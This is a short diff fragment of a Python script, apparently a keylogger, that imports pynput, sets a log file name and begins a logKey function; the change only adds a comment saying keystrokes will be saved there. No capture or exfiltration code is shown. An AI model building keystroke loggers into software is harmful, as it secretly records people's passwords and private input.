@@ -2,6 +2,7 @@
 
 import pynput
 
+# path to the log file where the keystrokes will be saved
 LOG_FILE = "log.txt"
 
 def logKey(key):
